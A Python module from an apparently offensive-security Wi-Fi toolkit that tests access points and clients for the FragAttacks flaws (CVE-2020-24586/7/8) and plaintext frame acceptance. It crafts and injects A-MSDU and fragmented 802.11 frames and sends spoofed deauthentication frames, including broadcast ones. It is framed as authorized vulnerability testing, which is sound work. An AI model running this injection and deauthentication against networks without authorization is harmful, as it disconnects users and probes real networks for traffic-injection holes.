#!/usr/bin/env python3
"""
FragAttacks (Frame Fragmentation/Aggregation Vulnerability Testing) Module
for Hoover WiFi Security Toolkit.

Tests target access points / clients for the FragAttacks family of
vulnerabilities (Vanhoef, 2021):

  - CVE-2020-24588: A-MSDU injection (A-MSDU flag not authenticated)
  - CVE-2020-24587: Mixed key fragment reassembly
  - CVE-2020-24586: Fragment cache not cleared on (re)connection
  - Plaintext frame acceptance during/around the handshake

REALISTIC LIMITATION: Full FragAttacks testing against encrypted traffic
requires knowledge of the PTK or performing the attack during/after a
handshake. This module focuses on testing unencrypted/observable
behaviors (A-MSDU SPP enforcement, fragment cache side effects via
injected ICMP probes, and plaintext frame acceptance). For a complete
test against encrypted traffic, use the dedicated hostapd/wpa_supplicant
based FragAttacks tool by Mathy Vanhoef.

For authorized security testing and research only.
"""

import argparse
import json
import os
import sys
import threading
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11QoS
from scapy.layers.inet import ICMP
from scapy.layers.l2 import LLC, SNAP
from scapy.packet import Raw
from scapy.sendrecv import sendp, sniff

from utils import require_root, setup_logging, validate_interface, validate_mac

# Supported FragAttacks test modes
TEST_MODES = ("aggregation", "mixed-key", "cache", "plaintext", "all")

# More Fragments bit within Dot11 FCfield
FCFIELD_MORE_FRAGMENTS = 0x04

# A-MSDU Present subfield bit within 802.11n QoS Control field
QOS_AMSDU_PRESENT_BIT = 0x80


class FragAttacks:
    """FragAttacks vulnerability tester for authorized WiFi security testing.

    Builds and injects crafted A-MSDU and fragmented 802.11 frames to test
    whether a target access point (and/or client) is vulnerable to the
    FragAttacks family of fragmentation/aggregation flaws.
    """

    # Maps a CLI/test mode name to the internal test method name.
    _MODE_TEST_MAP = {
        "aggregation": "_test_amsdu_injection",
        "mixed-key": "_test_mixed_key_fragment",
        "cache": "_test_fragment_cache_attack",
        "plaintext": "_test_plaintext_injection",
    }

    def __init__(self, interface: str, target_bssid: str,
                 target_client: Optional[str] = None,
                 channel: Optional[int] = None,
                 timeout: int = 120,
                 output_dir: str = "captures",
                 test_mode: str = "aggregation") -> None:
        self.interface: str = interface
        self.target_bssid: str = target_bssid
        self.target_client: Optional[str] = target_client
        self.channel: Optional[int] = channel
        self.timeout: int = timeout
        self.output_dir: str = output_dir
        self.test_mode: str = test_mode
        self.logger = setup_logging("fragattacks")

        self._sequence_number: int = 0
        self._lock = threading.Lock()
        self._start_time: Optional[float] = None
        self._running: bool = False

        self.captured_fragments: list[dict] = []
        self.responses: list[dict] = []
        self.results: dict = {}

    # ------------------------------------------------------------------
    # Frame-building helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _mac_to_bytes(mac: str) -> bytes:
        """Convert a colon-separated MAC address string to 6 raw bytes."""
        return bytes(int(octet, 16) for octet in mac.split(":"))

    def _build_amsdu_frame(self, subframes: list) -> bytes:
        """Build a raw A-MSDU payload from a list of subframes.

        Each subframe is a (dst_mac, src_mac, payload) tuple. The A-MSDU
        subframe format is: DA (6 bytes) + SA (6 bytes) + Length
        (2 bytes, big-endian) + payload, padded with zero bytes to the
        next 4-byte boundary (except typically the final subframe, but
        padding every subframe keeps the builder simple and correct for
        parsers that expect alignment throughout).

        Args:
            subframes: List of (dst_mac, src_mac, payload) tuples.

        Returns:
            Raw bytes of the concatenated, padded A-MSDU subframes.
        """
        data = b""
        for dst_mac, src_mac, payload in subframes:
            da = self._mac_to_bytes(dst_mac)
            sa = self._mac_to_bytes(src_mac)
            length = len(payload).to_bytes(2, "big")
            subframe = da + sa + length + payload
            pad_len = (-len(subframe)) % 4
            subframe += b"\x00" * pad_len
            data += subframe
        return data

    def _build_fragmented_frame(self, payload: bytes, fragment_size: int) -> list:
        """Split payload into Dot11 fragments with correct SC fields.

        Args:
            payload: Raw bytes to split across multiple 802.11 fragments.
            fragment_size: Maximum number of payload bytes per fragment.

        Returns:
            List of Dot11/Raw packets, one per fragment, with fragment
            number, sequence number and the More Fragments flag set
            correctly (last fragment has MF cleared).
        """
        if fragment_size <= 0:
            raise ValueError("fragment_size must be a positive integer")

        chunks = [payload[i:i + fragment_size]
                  for i in range(0, len(payload), fragment_size)]
        if not chunks:
            chunks = [b""]

        seq_num = self._sequence_number
        self._sequence_number = (self._sequence_number + 1) % 4096

        total = len(chunks)
        fragments = []
        for idx, chunk in enumerate(chunks):
            frag = (
                Dot11(
                    type=2, subtype=0,
                    addr1=self.target_client or self.target_bssid,
                    addr2=self.target_bssid,
                    addr3=self.target_bssid,
                )
                / Raw(load=chunk)
            )
            # Start from a known-good integer baseline before manipulating
            # bitfields, since freshly constructed/mocked packets may not
            # expose an existing integer SC/FCfield value.
            frag.SC = 0
            frag.FCfield = 0
            frag = self._set_sequence_number(frag, seq_num)
            more_fragments = idx < total - 1
            frag = self._set_fragment_number(frag, idx, more_fragments)
            fragments.append(frag)
        return fragments

    def _set_fragment_number(self, packet, frag_num: int, more_fragments: bool):
        """Set the fragment number (bits 0-3) of the Dot11 SC field.

        Also sets/clears the More Fragments bit in FCfield.

        Args:
            packet: Dot11 packet whose SC/FCfield will be modified.
            frag_num: Fragment number (0-15).
            more_fragments: Whether the More Fragments bit should be set.

        Returns:
            The same packet, mutated in place.
        """
        current_sc = getattr(packet, "SC", 0)
        if not isinstance(current_sc, int):
            current_sc = 0
        seq_num = (current_sc >> 4) & 0xFFF
        packet.SC = (seq_num << 4) | (frag_num & 0xF)

        current_fc = getattr(packet, "FCfield", 0)
        if not isinstance(current_fc, int):
            current_fc = 0
        if more_fragments:
            packet.FCfield = current_fc | FCFIELD_MORE_FRAGMENTS
        else:
            packet.FCfield = current_fc & ~FCFIELD_MORE_FRAGMENTS

        return packet

    def _set_sequence_number(self, packet, seq_num: int):
        """Set the sequence number (bits 4-15) of the Dot11 SC field.

        Args:
            packet: Dot11 packet whose SC field will be modified.
            seq_num: Sequence number (0-4095).

        Returns:
            The same packet, mutated in place.
        """
        current_sc = getattr(packet, "SC", 0)
        if not isinstance(current_sc, int):
            current_sc = 0
        frag_num = current_sc & 0xF
        packet.SC = ((seq_num & 0xFFF) << 4) | frag_num
        return packet

    # ------------------------------------------------------------------
    # Sniffing / packet handling
    # ------------------------------------------------------------------

    def packet_handler(self, packet) -> None:
        """Monitor for fragmented/A-MSDU frame responses from the target.

        Looks for ICMP responses sourced from the target BSSID, which
        indicate that an injected fragment/A-MSDU frame was accepted and
        reassembled/forwarded by the target.

        Args:
            packet: Scapy packet from the sniffer.
        """
        try:
            if not packet.haslayer(Dot11):
                return

            dot11 = packet[Dot11]
            src = getattr(dot11, "addr2", None)
            if not src or not self.target_bssid:
                return
            if src.lower() != self.target_bssid.lower():
                return

            if packet.haslayer(ICMP):
                entry = {
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "src": src,
                    "type": "icmp_response",
                }
                with self._lock:
                    self.responses.append(entry)
                self.logger.info(
                    "Response observed from target %s - frame may have been accepted",
                    src,
                )
        except Exception as e:
            self.logger.error("Error in packet handler: %s", e)

    def _sniff_for_response(self, duration: int = 5) -> bool:
        """Sniff for a limited duration and report whether a new response arrived.

        Args:
            duration: Number of seconds to sniff.

        Returns:
            True if at least one new response was observed during sniffing.
        """
        with self._lock:
            before = len(self.responses)
        try:
            sniff(iface=self.interface, prn=self.packet_handler,
                  timeout=duration, store=0)
        except Exception as e:
            self.logger.error("Sniff error: %s", e)
        with self._lock:
            after = len(self.responses)
        return after > before

    # ------------------------------------------------------------------
    # Individual FragAttacks tests
    # ------------------------------------------------------------------

    def _test_amsdu_injection(self) -> dict:
        """CVE-2020-24588: inject A-MSDU with SPP flag not set; test if accepted."""
        self.logger.info("Testing A-MSDU injection / SPP enforcement (CVE-2020-24588)...")
        dst = self.target_client or "ff:ff:ff:ff:ff:ff"
        probe_payload = b"\x08\x00\x45\x00FRAGPROBE"
        subframes = [(dst, self.target_bssid, probe_payload)]
        amsdu_payload = self._build_amsdu_frame(subframes)

        frame = (
            Dot11(
                type=2, subtype=8,
                addr1=dst, addr2=self.target_bssid, addr3=self.target_bssid,
            )
            / Dot11QoS()
            / Raw(load=amsdu_payload)
        )

        try:
            sendp(frame, iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.error("Failed to send A-MSDU frame: %s", e)

        vulnerable = self._sniff_for_response(duration=5)
        return {
            "test": "amsdu_injection",
            "cve": "CVE-2020-24588",
            "vulnerable": vulnerable,
            "details": (
                "Target appears to accept unauthenticated A-MSDU frames"
                if vulnerable else
                "No observable response to unauthenticated A-MSDU frame"
            ),
        }

    def _test_mixed_key_fragment(self) -> dict:
        """CVE-2020-24587: send first fragment, trigger rekey, send second with new key."""
        self.logger.info("Testing mixed key fragment reassembly (CVE-2020-24587)...")
        payload = b"A" * 64
        fragments = self._build_fragmented_frame(payload, fragment_size=32)

        try:
            if fragments:
                sendp(fragments[0], iface=self.interface, verbose=False)

            # Trigger a rekey/handshake renegotiation window by forcing a
            # deauth (many implementations renegotiate PTK on reassociation).
            deauth = (
                Dot11(
                    addr1=self.target_client or "ff:ff:ff:ff:ff:ff",
                    addr2=self.target_bssid,
                    addr3=self.target_bssid,
                )
                / Dot11Deauth(reason=1)
            )
            sendp(deauth, iface=self.interface, verbose=False)
            time.sleep(1)

            if fragments:
                sendp(fragments[-1], iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.error("Failed during mixed-key fragment test: %s", e)

        vulnerable = self._sniff_for_response(duration=5)
        return {
            "test": "mixed_key_fragment",
            "cve": "CVE-2020-24587",
            "vulnerable": vulnerable,
            "details": (
                "Fragment appears to have been reassembled across a key change"
                if vulnerable else
                "No observable evidence of cross-key fragment reassembly"
            ),
        }

    def _test_fragment_cache_attack(self) -> dict:
        """CVE-2020-24586: inject fragment, disconnect client, reconnect; test old fragment use."""
        self.logger.info("Testing fragment cache persistence (CVE-2020-24586)...")
        payload = b"B" * 64
        fragments = self._build_fragmented_frame(payload, fragment_size=32)

        try:
            if fragments:
                sendp(fragments[0], iface=self.interface, verbose=False)

            # Disconnect the client
            deauth = (
                Dot11(
                    addr1=self.target_client or "ff:ff:ff:ff:ff:ff",
                    addr2=self.target_bssid,
                    addr3=self.target_bssid,
                )
                / Dot11Deauth(reason=7)
            )
            sendp(deauth, iface=self.interface, verbose=False)
            time.sleep(2)

            # Send second fragment after (simulated) reconnection
            if fragments:
                sendp(fragments[-1], iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.error("Failed during fragment cache test: %s", e)

        vulnerable = self._sniff_for_response(duration=5)
        return {
            "test": "fragment_cache",
            "cve": "CVE-2020-24586",
            "vulnerable": vulnerable,
            "details": (
                "Fragment cache was not cleared on reconnection"
                if vulnerable else
                "No observable evidence of stale fragment cache use"
            ),
        }

    def _test_plaintext_injection(self) -> dict:
        """Test for plaintext frame acceptance during handshake."""
        self.logger.info("Testing plaintext frame injection during handshake...")
        dst = self.target_client or "ff:ff:ff:ff:ff:ff"

        frame = (
            Dot11(
                type=2, subtype=0,
                addr1=dst, addr2=self.target_bssid, addr3=self.target_bssid,
            )
            / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
            / SNAP(OUI=0, code=0x0800)
            / Raw(load=b"\x45\x00PLAINTEXTPROBE")
        )

        try:
            sendp(frame, iface=self.interface, verbose=False)
        except Exception as e:
            self.logger.error("Failed to send plaintext frame: %s", e)

        vulnerable = self._sniff_for_response(duration=5)
        return {
            "test": "plaintext_injection",
            "cve": "N/A",
            "vulnerable": vulnerable,
            "details": (
                "Target accepted plaintext data frame during handshake window"
                if vulnerable else
                "No observable response to plaintext frame injection"
            ),
        }

    # ------------------------------------------------------------------
    # Orchestration
    # ------------------------------------------------------------------

    def start(self) -> dict:
        """Run selected FragAttack test(s) and return results.

        Returns:
            Dict containing test results for the selected mode.
        """
        self._running = True
        self._start_time = time.time()
        self.results = {
            "interface": self.interface,
            "target_bssid": self.target_bssid,
            "target_client": self.target_client,
            "test_mode": self.test_mode,
            "start_time": datetime.now().isoformat(),
            "tests": [],
        }

        if self.test_mode == "all":
            modes_to_run = list(self._MODE_TEST_MAP.keys())
        else:
            modes_to_run = [self.test_mode]

        for mode in modes_to_run:
            method_name = self._MODE_TEST_MAP.get(mode)
            if method_name is None:
                continue
            test_fn = getattr(self, method_name, None)
            if test_fn is None:
                continue
            try:
                result = test_fn()
                self.results["tests"].append(result)
            except Exception as e:
                self.logger.error("Test %s failed: %s", mode, e)
                self.results["tests"].append({
                    "test": mode,
                    "error": str(e),
                })

        self.results["end_time"] = datetime.now().isoformat()
        self._running = False
        return self.results

    def save_results(self) -> Optional[str]:
        """Save test results to a JSON file.

        Returns:
            Path to saved JSON file, or None if no results.
        """
        if not self.results:
            return None

        os.makedirs(self.output_dir, exist_ok=True)
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"fragattack_{self.test_mode}_{timestamp}.json"
        filepath = os.path.join(self.output_dir, filename)

        with open(filepath, "w") as f:
            json.dump(self.results, f, indent=2)

        self.logger.info("Results saved to %s", filepath)
        return filepath

    def get_status(self) -> dict:
        """Return current test status.

        Returns:
            Dict with running state, test mode, and results summary.
        """
        return {
            "running": self._running,
            "test_mode": self.test_mode,
            "interface": self.interface,
            "target_bssid": self.target_bssid,
            "tests_completed": len(self.results.get("tests", [])),
            "responses_captured": len(self.responses),
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "FragAttacks - WiFi Fragmentation/Aggregation Vulnerability Tester. "
            "For authorized penetration testing only."
        )
    )
    parser.add_argument(
        "-i", "--interface", required=True,
        help="Wireless interface in monitor mode",
    )
    parser.add_argument(
        "-b", "--bssid", required=True,
        help="Target AP BSSID",
    )
    parser.add_argument(
        "-c", "--client", default=None,
        help="Target client MAC address",
    )
    parser.add_argument(
        "-ch", "--channel", type=int, default=None,
        help="WiFi channel number",
    )
    parser.add_argument(
        "-t", "--timeout", type=int, default=120,
        help="Test timeout in seconds (default: 120)",
    )
    parser.add_argument(
        "-m", "--mode",
        choices=list(TEST_MODES),
        default="aggregation",
        help="Test mode (default: aggregation)",
    )
    parser.add_argument(
        "-o", "--output-dir", default="captures",
        help="Output directory for results (default: captures)",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Enable verbose logging",
    )

    args = parser.parse_args()
    require_root()

    if not validate_interface(args.interface):
        print(f"Error: Invalid interface: {args.interface}", file=sys.stderr)
        sys.exit(1)

    if not validate_mac(args.bssid):
        print(f"Error: Invalid BSSID: {args.bssid}", file=sys.stderr)
        sys.exit(1)

    if args.client and not validate_mac(args.client):
        print(f"Error: Invalid client MAC: {args.client}", file=sys.stderr)
        sys.exit(1)

    attacker = FragAttacks(
        interface=args.interface,
        target_bssid=args.bssid,
        target_client=args.client,
        channel=args.channel,
        timeout=args.timeout,
        output_dir=args.output_dir,
        test_mode=args.mode,
    )

    if args.verbose:
        attacker.logger = setup_logging("fragattacks", verbose=True)

    results = attacker.start()
    saved_path = attacker.save_results()

    # Print summary
    for test_result in results.get("tests", []):
        status = "VULNERABLE" if test_result.get("vulnerable") else "Not vulnerable"
        print(f"[{status}] {test_result.get('test', 'unknown')}: "
              f"{test_result.get('details', '')}")

    if saved_path:
        print(f"\nResults saved to: {saved_path}")


if __name__ == "__main__":
    main()
